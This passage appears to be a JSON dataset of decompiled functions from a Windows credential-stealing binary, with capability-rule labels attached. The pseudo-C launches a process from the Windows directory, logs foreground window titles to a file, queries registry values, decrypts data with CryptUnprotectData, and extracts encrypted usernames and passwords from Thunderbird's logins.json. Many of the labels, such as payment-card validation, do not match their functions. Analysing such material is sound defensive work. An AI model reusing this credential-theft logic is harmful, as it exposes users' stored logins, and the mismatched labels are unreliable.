            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "get common file path"
        ],
        "decompiled_code": "\nuint fcn.00407948(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_10h;\n    uint var_60h;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.0040f7e0();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0xff, 0x1000, 0x40);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(iVar1, 0x104);\n    arg_10h = 0x41493c;\n    iVar3 = iVar1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar1, 0x41493c, 0x14);\n    fcn.0040102c(iVar2 + iVar1, iVar3, arg_10h);\n    fcn.00401052(&var_60h, 0, 0x44);\n    var_14h = 0;\n    uStack20 = 0;\n    var_ch = 0;\n    uStack12 = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(iVar1, 0, 0, 0, 0, 0x8000000, 0, 0, &var_60h, &var_14h);\n    if (iVar3 == 0) {\n        var_ch = fcn.0040f7b9();\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    }\n    return var_ch;\n}\n",
        "token_count": 388
    },
    "00407c1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.00407c1d(uint arg_8h, uint arg_ch)\n\n{\n    uint64_t uVar1;\n    int16_t iVar2;\n    int32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x54e0b0 = CONCAT44(*0x54e0b4, *0x54e0b0);\n    if (((*0x54e0b0 == 0) && (*0x54e0b0 = CONCAT44(*0x54e0b4, *0x54e0b0),  *0x54e0b4 == 0)) &&\n       (*0x54e0b0 = fcn.00407d1c(),  *0x54e0b0 == 0)) {\n        var_8h = 0;\n        var_4h = 0;\n    }\n    else {\n        _var_18h = 0;\n        iVar2 = fcn.00401133();\n        var_18h = CONCAT22(iVar2 + 1, iVar2);\n        uVar1 = _var_18h & 0xffffffff00000000;\n        _var_18h = uVar1 | var_18h;\n        _var_8h = 0;\n        fcn.0040839e(*0x54e0b0, *0x54e0b4, 4, arg_8h, arg_ch, &var_18h, &var_18h >> 0x1f, 0, 0, &var_8h, &var_8h >> 0x1f\n                     , unaff_EDI, unaff_ESI, var_18h, uVar1 >> 0x20, in_ECX, in_ECX >> 0x1f, 0, 0, unaff_EBP, \n                     unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, in_stack_00000010);\n    }\n    *0x54e0b4 = *0x54e0b0 >> 0x20;\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 636
    },
    "00408568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00408568(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint unaff_retaddr;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    *0x54e0c8 = CONCAT44(*0x54e0cc, *0x54e0c8);\n    if ((*0x54e0c8 == 0) && (*0x54e0c8 = CONCAT44(*0x54e0cc, *0x54e0c8),  *0x54e0cc == 0)) {\n        uVar1 = fcn.00407fc0();\n        *0x54e0c8 = fcn.00407c1d(uVar1, uVar1 >> 0x20);\n        if (*0x54e0c8 == 0) goto code_r0x00408610;\n    }\n    *0x54e0cc = *0x54e0c8 >> 0x20;\n    if (arg_14h == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = *arg_14h;\n    }\n    var_ch = 0;\n    iVar2 = fcn.0040839e(*0x54e0c8, *0x54e0cc, 5, in_ECX, in_ECX >> 0x1f, arg_8h, arg_ch, in_EDX, in_EDX >> 0x1f, \n                         arg_10h, 0, &var_10h, &var_10h >> 0x1f, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffffe8, \n                         var_10h, 0, in_stack_fffffff4, in_ECX, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        if (arg_14h != NULL) {\n            *arg_14h = var_10h;\n        }\n        *0x54e0cc = *0x54e0c8 >> 0x20;\n        return 1;\n    }\n    fcn.00407cb7(iVar2);\ncode_r0x00408610:\n    *0x54e0cc = *0x54e0c8 >> 0x20;\n    return 0;\n}\n",
        "token_count": 673
    },
    "00408633": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.00408633(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint in_stack_ffffffe0;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    *0x54e0a0 = CONCAT44(*0x54e0a4, *0x54e0a0);\n    if ((*0x54e0a0 == 0) && (*0x54e0a0 = CONCAT44(*0x54e0a4, *0x54e0a0),  *0x54e0a4 == 0)) {\n        uVar1 = fcn.00407fc0();\n        *0x54e0a0 = fcn.00407c1d(uVar1, uVar1 >> 0x20);\n        if (*0x54e0a0 != 0) goto code_r0x00408684;\n    }\n    else {\ncode_r0x00408684:\n        *0x54e0a4 = *0x54e0a0 >> 0x20;\n        var_10h = arg_8h;\n        var_ch = arg_ch;\n        var_14h = 0;\n        iVar2 = fcn.0040839e(*0x54e0a0, *0x54e0a4, 6, in_ECX, in_ECX >> 0x1f, &var_10h, &var_10h >> 0x1f, 0, 0, &var_18h\n                             , &var_18h >> 0x1f, 0x3000, 0, 0x40, 0, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffffe0\n                             , in_EDX, 0, arg_8h, arg_ch, in_stack_fffffff4, in_ECX);\n        if (iVar2 == 0) goto code_r0x004086dc;\n        fcn.00407cb7(iVar2);\n    }\n    var_10h = 0;\n    var_ch = 0;\ncode_r0x004086dc:\n    *0x54e0a4 = *0x54e0a0 >> 0x20;\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 666
    },
    "004086e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004086e1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    _var_8h = 0;\n    var_18h = 0;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    *0x54e0d0 = CONCAT44(*0x54e0d4, *0x54e0d0);\n    if ((*0x54e0d0 == 0) && (*0x54e0d0 = CONCAT44(*0x54e0d4, *0x54e0d0),  *0x54e0d4 == 0)) {\n        uVar1 = fcn.00407fc0();\n        *0x54e0d0 = fcn.00407c1d(uVar1, uVar1 >> 0x20);\n        if (*0x54e0d0 != 0) goto code_r0x0040873b;\n    }\n    else {\ncode_r0x0040873b:\n        *0x54e0d4 = *0x54e0d0 >> 0x20;\n        iVar2 = fcn.0040839e(*0x54e0d0, *0x54e0d4, 10, arg_8h, arg_ch, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, arg_10h, arg_14h, 0\n                             , 0, &var_8h, &var_8h >> 0x1f, &var_18h, &var_18h >> 0x1f, unaff_EDI, unaff_ESI);\n        if (iVar2 == 0) {\n            goto code_r0x00408788;\n        }\n        fcn.00407cb7(iVar2);\n    }\n    var_8h = 0;\n    var_4h = 0;\ncode_r0x00408788:\n    *0x54e0d4 = *0x54e0d0 >> 0x20;\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 573
    },
    "0040878c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040878c(uint arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint unaff_retaddr;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x54e0a8 = CONCAT44(*0x54e0ac, *0x54e0a8);\n    if ((*0x54e0a8 == 0) && (*0x54e0a8 = CONCAT44(*0x54e0ac, *0x54e0a8),  *0x54e0ac == 0)) {\n        uVar1 = fcn.00407fc0();\n        *0x54e0a8 = fcn.00407c1d(uVar1, uVar1 >> 0x20);\n        if (*0x54e0a8 == 0) goto code_r0x00408828;\n    }\n    *0x54e0ac = *0x54e0a8 >> 0x20;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    var_4h = 0;\n    var_8h = 0x100000;\n    iVar2 = fcn.0040839e(*0x54e0a8, *0x54e0ac, 5, in_ECX, in_ECX >> 0x1f, &var_10h, &var_10h >> 0x1f, &var_8h, \n                         &var_8h >> 0x1f, 0x40, 0, arg_14h, arg_14h >> 0x1f, unaff_EDI, unaff_ESI, unaff_EBX, \n                         in_stack_ffffffe8, arg_8h, arg_ch, 0x100000, 0, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        return 1;\n    }\n    fcn.00407cb7(iVar2);\ncode_r0x00408828:\n    *0x54e0ac = *0x54e0a8 >> 0x20;\n    return 0;\n}\n",
        "token_count": 638
    },
    "00408e66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get graphical window text",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00408e66(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_ch;\n    uint var_8h;\n    uint lpString2;\n    \n    fcn.00401052(&lpString, 0, 0x208);\n    lpString2 = 0;\n    uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar5 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar4, &lpString, 0x104);\n    if (iVar5 < 1) {\n        fcn.004032ff(0x414ae0);\n    }\n    else {\n        uVar4 = fcn.004035e5(&lpString);\n        fcn.0040346a(0x414ad8);\n        fcn.00403335(uVar4);\n        fcn.0040346a(0x414adc);\n        fcn.00405ea5();\n        var_8h = 0;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrlenW;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x4196a0 + 0x210);\n    if (iVar5 != 0) {\n        uVar4 = fcn.004035e5(*0x4196a0 + 0x210);\n        iVar6 = fcn.00403248(uVar4);\n        fcn.00405ea5();\n        iVar5 = *0x4196a0;\n        var_8h = 0;\n        if (iVar6 != 0) {\n            *(*0x4196a0 + 0xa10) = 1;\n            goto code_r0x00408f69;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x4196a0 + 0x210, lpString2);\n    iVar5 = *0x4196a0;\n    *(*0x4196a0 + 0xa10) = 0;\ncode_r0x00408f69:\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(iVar5 + 0xc), 4, 1, 0, 4, 0x80, 0);\n    iVar5 = *0x4196a0;\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n    piVar1 = *0x4196a0 + 0xa10;\n    *(*0x4196a0 + 4) = uVar4;\n    if (*piVar1 == 0) {\n        uVar4 = (*pcVar3)(0x414ad0, iVar5 + 8, 0);\n        (*pcVar2)(*(*0x4196a0 + 4), 0x414ad0, uVar4);\n        uVar4 = lpString2;\n        iVar5 = fcn.00403261(*0x4196a0 + 8, 0);\n        (*pcVar2)(*(*0x4196a0 + 4), uVar4, iVar5 * 2);\n        uVar4 = (*pcVar3)(0x414ad0, *0x4196a0 + 8, 0);\n        (*pcVar2)(*(*0x4196a0 + 4), 0x414ad0, uVar4);\n        iVar5 = *0x4196a0;\n    }\n    iVar5 = (*pcVar3)(var_ch, iVar5 + 8, 0);\n    (*pcVar2)(*(*0x4196a0 + 4), var_ch, iVar5 * 2);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(*0x4196a0 + 4));\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 875
    },
    "00409eb7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409eb7(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    uVar1 = *param_2;\n    iVar4 = *param_1;\n    iVar5 = 0;\n    iVar3 = fcn.0040308c();\n    pcVar2 = _sym.imp.SHLWAPI.dll_StrStrA;\n    while( true ) {\n        iVar4 = (*pcVar2)(iVar4, uVar1);\n        if (iVar4 == 0) break;\n        iVar5 = iVar5 + 1;\n        iVar4 = iVar3 + 4 + iVar4;\n    }\n    return iVar5;\n}\n",
        "token_count": 189
    },
    "00409ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409ef0(uint *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.0040308c();\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    iVar3 = *in_EDX;\n    uVar4 = *arg_8h;\n    do {\n        iVar3 = (*pcVar1)(iVar3, uVar4);\n        iVar3 = iVar2 + 3 + iVar3;\n        arg_ch = arg_ch + -1;\n    } while (arg_ch != 0);\n    iVar2 = (*pcVar1)(iVar3, 0x415f84);\n    uVar4 = fcn.00405e22();\n    fcn.00405f10(iVar2 - iVar3);\n    fcn.004033bf(uVar4);\n    fcn.00405ea5();\n    return in_ECX;\n}\n",
        "token_count": 257
    },
    "00409fb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409fb3(uint arg_8h)\n\n{\n    fcn.00402e93(&arg_8h);\n    fcn.00403036();\n    return;\n}\n",
        "token_count": 44
    },
    "0040a0d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: hKey\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0040a0d8(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    uint var_1010h;\n    uint uStackY208;\n    uint uStackY204;\n    uint *puStackY200;\n    uint uStackY196;\n    uint uStackY192;\n    uint *puStackY188;\n    uint uStackY184;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    hKey = 0x40a0e5;\n    fcn.00401190();\n    uVar4 = 0;\n    hKey = unaff_EBX;\n    fcn.00401052();\n    fcn.00401052();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n    if ((((iVar3 == 0) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) ||\n       (iVar3 = (*pcVar1)(),  iVar3 == 0)) {\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcpyW;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyW)();\n        if (iVar3 == 0) {\n            if (unaff_EDI != 0) {\n                do {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyExW)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    (*pcVar2)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uStackY184 = 0x40a25e;\n                    fcn.0040a29a(hKey);\n                    uStackY184 = hKey;\n                    puStackY188 = 0x40a267;\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    puStackY188 = &fcn.0040a0d8::hKey;\n                    uStackY192 = 0xf003f;\n                    uStackY196 = 0;\n                    puStackY200 = &fcn.0040a0d8::var_1010h;\n                    uStackY204 = 0x80000001;\n                    uStackY208 = 0x40a280;\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < unaff_EDI);\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 745
    },
    "0040a29a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040a29a(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStackY17204 [8192];\n    uchar auStackY9012 [8192];\n    uint var_330h;\n    uint var_228h;\n    uint var_120h;\n    uint uStackY256;\n    uint *arg_8h_00;\n    uchar *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x40a2a7;\n    fcn.00401190();\n    var_4h = 0x1000;\n    var_10h = NULL;\n    var_14h = NULL;\n    var_ch = 0;\n    fcn.00401052();\n    fcn.00401052();\n    fcn.00401052();\n    fcn.00401052();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    var_10h = &fcn.0040a29a::var_4h;\n    var_14h = &stack0xffffdccc;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)();\n    if (iVar2 == 0) {\n        fcn.004032ff(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.004032ff(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.004032ff(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.004032ff(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.004032ff(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.0040a632(var_4h);\n        fcn.004032ff(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.0040a632(var_4h);\n        fcn.004032ff(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.0040a632(var_4h);\n        fcn.004032ff(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.0040a632(var_4h);\n        fcn.004032ff(&stack0xffffbccc);\n    }\n    var_8h = 3;\n    iVar2 = fcn.00403261();\n    if (0 < iVar2) {\n        arg_8h_00 = &fcn.0040a29a::var_14h;\n        uStackY256 = 0x40a619;\n        fcn.00401f95(arg_8h_00);\n        uStackY256 = 0x40a620;\n        fcn.00401fcb(arg_8h_00);\n    }\n    fcn.004013ef();\n    return 1;\n}\n",
        "token_count": 1009
    },
    "0040a632": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: pDataIn\n\nvoid __cdecl fcn.0040a632(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t extraout_ECX;\n    uint16_t *puVar2;\n    uint extraout_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    char16_t acStack8216 [4076];\n    uint uStack64;\n    uint uStack60;\n    char16_t *pcStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint pDataOut;\n    int32_t var_10h;\n    int32_t pDataIn;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0x40a63f;\n    fcn.00401190();\n    var_10h = arg_8h + -1;\n    pDataOut = 0x40;\n    puStack28 = 0x40a656;\n    var_4h = extraout_ECX;\n    var_8h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    iVar3 = 1;\n    if (1 < arg_8h) {\n        do {\n            *(var_8h + -1 + iVar3) = *(iVar3 + var_4h);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    pDataIn = arg_8h + -1;\n    iVar4 = 0;\n    puStack28 = &fcn.0040a632::pDataOut;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 0;\n    puStack52 = &fcn.0040a632::pDataIn;\n    pcStack56 = 0x40a68c;\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)();\n    if (iVar3 == 0) {\n        pcStack56 = L\"Could not decrypt\";\n    }\n    else {\n        if (0 < arg_8h) {\n            puVar2 = &stack0xffffdfe8;\n            do {\n                puVar1 = var_10h + iVar4;\n                iVar4 = iVar4 + 2;\n                *puVar2 = *puVar1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < arg_8h);\n        }\n        pcStack56 = &stack0xffffdfe8;\n    }\n    uStack64 = 0x40a6c3;\n    uStack60 = extraout_EDX;\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n    return;\n}\n",
        "token_count": 675
    },
    "0040a6c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists",
            "read .ini file",
            "copy file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a6c8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint uVar8;\n    uint var_4c4h;\n    uint lpApplicationName;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_9ch;\n    uint lpBinaryType;\n    int32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpExistingFileName;\n    uint lpNewFileName;\n    uint var_8h;\n    \n    var_1ch = in_ECX;\n    fcn.004035e5(L\"Profile\");\n    uVar4 = 0;\n    fcn.00401052(&var_4c4h, 0, 0x208);\n    var_34h = 0;\n    lpBinaryType = 0;\n    fcn.00401052(&lpApplicationName, 0, 0x104);\n    fcn.0040c118();\n    fcn.004035e5(&lpApplicationName);\n    (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)(&lpApplicationName, &lpBinaryType);\n    puVar5 = &var_28h;\n    fcn.0040362d(puVar5);\n    iVar1 = fcn.0040b67e(puVar5);\n    if (iVar1 == 0) {\n        puVar5 = &var_28h;\n        fcn.0040362d(puVar5);\n        iVar1 = fcn.0040b67e(puVar5);\n        if (iVar1 == 0) goto code_r0x0040abea;\n    }\n    fcn.0040346a(L\"\\\\Thunderbird\\\\\");\n    fcn.0040362d(&arg_8h);\n    fcn.0040346a(L\"profiles.ini\");\n    uVar4 = fcn.004035e5(L\"Profile\");\n    fcn.00403437(uVar4);\n    fcn.00405ea5();\n    fcn.00403272(0);\n    while (iVar1 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(var_14h, L\"Path\", 0, &var_4c4h, 0x104, var_20h), \n          iVar1 != 0) {\n        iVar1 = var_34h + 1;\n        var_34h = iVar1;\n        uVar4 = fcn.004035e5(L\"Profile\");\n        fcn.00403437(uVar4);\n        fcn.00405ea5();\n        var_38h = 0;\n        fcn.00403272(iVar1);\n        fcn.0040362d(&arg_8h);\n        fcn.0040346a(&var_4c4h);\n        fcn.00403554(&var_18h);\n        iVar1 = (**(in_ECX + 0x68))(var_18h);\n        if (((iVar1 == 0) && (var_94h = (**(in_ECX + 0x80))(),  var_94h != 0)) &&\n           (iVar1 = (**(in_ECX + 0x7c))(var_94h, 1, 0),  iVar1 == 0)) {\n            fcn.0040362d(&var_8h);\n            fcn.0040346a(L\"\\\\logins.json\");\n            fcn.0040f76b();\n            fcn.0040346a(0x414684);\n            uVar4 = fcn.004034a7();\n            fcn.00403335(uVar4);\n            fcn.00405ea5();\n            var_3ch = 0;\n            fcn.0040346a(L\".tmp\");\n            uVar4 = lpNewFileName;\n            iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, lpNewFileName, 0);\n            if (iVar1 != 0) {\n                fcn.00403437(&lpNewFileName);\n            }\n            fcn.0040fece();\n            fcn.00403437(&lpExistingFileName);\n            uVar7 = 0xc0000000;\n            uVar8 = extraout_ECX;\n            iVar1 = fcn.00410192(0xc0000000);\n            if (iVar1 != 0) {\n                var_30h = 0;\n                var_2ch = 0;\n                fcn.0040fe3d(&var_30h, var_a0h, 0);\n                fcn.004033bf(\"encryptedUsername\");\n                fcn.00402f22(&var_9ch);\n                iVar2 = fcn.00409eb7();\n                var_68h = iVar2;\n                fcn.00405ea5();\n                fcn.00405ea5();\n                iVar1 = var_68h;\n                while (iVar2 != 0) {\n                    pcVar6 = \"hostname\";\n                    var_60h = 0;\n                    var_5ch = 0;\n                    var_58h = 0;\n                    iVar2 = iVar1;\n                    uVar4 = fcn.004033bf(\"hostname\");\n                    puVar5 = &var_6ch;\n                    fcn.00402f22(puVar5);\n                    fcn.00409ef0(puVar5, uVar4);\n                    fcn.00405ea5(pcVar6, iVar2);\n                    fcn.00405ea5();\n                    pcVar6 = \"encryptedUsername\";\n                    iVar2 = iVar1;\n                    uVar4 = fcn.004033bf(\"encryptedUsername\");\n                    puVar5 = &var_74h;\n                    fcn.00402f22(puVar5);\n                    fcn.00409ef0(puVar5, uVar4);\n                    fcn.00405ea5(pcVar6, iVar2);\n                    fcn.00405ea5();\n                    pcVar6 = \"encryptedPassword\";\n                    iVar2 = 